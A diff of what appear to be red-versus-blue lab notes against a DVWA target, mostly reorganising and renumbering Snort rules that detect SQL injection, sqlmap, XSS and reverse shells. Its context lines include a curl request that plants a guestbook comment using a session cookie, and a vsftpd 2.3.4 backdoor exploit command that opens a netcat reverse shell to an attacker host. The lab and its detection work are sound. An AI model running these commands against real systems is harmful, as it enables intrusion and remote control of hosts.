@@ -26,26 +26,15 @@ Attacker user his machine to add a comment using cookie
     curl -X POST -b "security=low; PHPSESSID=9ecc84081433870a847d9c096762a91f" -d "txtName=WhoAmI&mtxMessage=You%27ve+been+hacked&btnSign=Sign+Guestbook" http://10.30.0.235/dvwa/vulnerabilities/xss_s/
 
 -------------------------------------------------------------------
-BLUE - DEFEND
+BLUE - DEFEND (Reverse Shell)
 -------------------------------------------------------------------
 In DMZ interface, remove all extra "LANDM Categories"
 
-SQLi Rule(s): 
-    alert tcp any any -> 10.30.0.235 80 (msg: “SQLi attack  detected”; pcre:“/^GET\s(\d*|\D*|\s)\?id=%27OR\+%271%27%3D%271/m”;sid:1000001;rev:1;)
-
-    alert tcp any any -> 10.30.0.235 80 (content:"/";http_uri;flow:to_server,established;pcre:"/('|%27)(\s|%20|\+)*or(\s|%20|\+)*('|%27)1('|%27)(\s|%20|\+)*(=|%3D)(\s|%20|\+)*('|%27)1/i";msg:"Possible SQL Injection Attack Detected";sid:1000001;rev:1)
-
-    alert tcp any any -> 10.30.0.235 80 (pcre:”/ id\=\%(\d|\D){2}OR\+\%(\d|\D){2}\d+\%(\d|\D){2}\%3D/”;msg:”SQLi alert!”;sid:1000006;rev:1;)
-
-    alert tcp any any -> 10.30.0.235 80 (content:"User-Agent: sqlmap"; msg:"sqlmap detected";sid:1000005;rev:1)
-
-    block tcp any any -> 10.30.0.235 80 (pcre:"/id=(\w*|\W*)(\W\w{2}){1,}(UNION|ALL|SELECT|NULL|CONCAT)(\W\w{2}){1,}(UNION|ALL|SELECT|NULL|CONCAT)/";msg:"SQL injection!";sid:1000004;rev:1;)
-
 Reverse Shell Rule(s):
 
-    alert tcp any any -> 10.30.0.235 21 (msg:"Possible Reverse Shell Attack Detected - Port 21";flow:to_server,established;content:"USER ";nocase;pcre:"/^USER\s+[^\r\n]*:\)\r?$/smi";sid:1000002;rev:1)
+    alert tcp any any -> 10.30.0.235 21 (msg:"Possible Reverse Shell Attack Detected - Port 21";flow:to_server,established;content:"USER ";nocase;pcre:"/^USER\s+[^\r\n]*:\)\r?$/smi";sid:1000033;rev:1)
     
-    alert tcp any any -> 10.30.0.235 6200 (msg:"Possible Reverse Shell Attack Detected - Port 6200";flow:to_server,established;sid:1000003;rev:1)    
+    alert tcp any any -> 10.30.0.235 6200 (msg:"Possible Reverse Shell Attack Detected - Port 6200";flow:to_server,established;sid:1000044;rev:1)    
 
     /bin/sh or /bin/bash
 
@@ -59,4 +48,19 @@ https://github.com/ahervias77/vsftpd-2.3.4-exploit/archive/refs/heads/master.zip
 python3 vsftpd_234_exploit.py <Target IP> 21 “netcat -nv <Kali IP address> 4444 -e /bin/bash”
 
 -------------------------------------------------------------------
+BLUE - DEFEND (Others)
+-------------------------------------------------------------------
+SQLi Rule(s): 
+    alert tcp any any -> 10.30.0.235 80 (msg: “SQLi attack  detected”; pcre:“/^GET\s(\d*|\D*|\s)\?id=%27OR\+%271%27%3D%271/m”;sid:1000001;rev:1;)
+
+    alert tcp any any -> 10.30.0.235 80 (content:"/";http_uri;flow:to_server,established;pcre:"/('|%27)(\s|%20|\+)*or(\s|%20|\+)*('|%27)1('|%27)(\s|%20|\+)*(=|%3D)(\s|%20|\+)*('|%27)1/i";msg:"Possible SQL Injection Attack Detected";sid:1000002;rev:1)
+
+    alert tcp any any -> 10.30.0.235 80 (pcre:”/ id\=\%(\d|\D){2}OR\+\%(\d|\D){2}\d+\%(\d|\D){2}\%3D/”;msg:”SQLi alert!”;sid:1000003;rev:1;)
+
+    alert tcp any any -> 10.30.0.235 80 (content:"User-Agent: sqlmap"; msg:"sqlmap detected";sid:1000004;rev:1)
+
+    block tcp any any -> 10.30.0.235 80 (pcre:"/id=(\w*|\W*)(\W\w{2}){1,}(UNION|ALL|SELECT|NULL|CONCAT)(\W\w{2}){1,}(UNION|ALL|SELECT|NULL|CONCAT)/";msg:"SQL injection!";sid:1000005;rev:1;)
+
+XSS Rule(s)
+    alert tcp any any -> 10.30.0.235 80 ( msg:"XSS Script Tag Detected"; flow:to_server,established; content:"script";nocase;pcre:"/(<|%3C)script(>|%3E)/i";sid:1000010; rev:5; priority:4; )
  
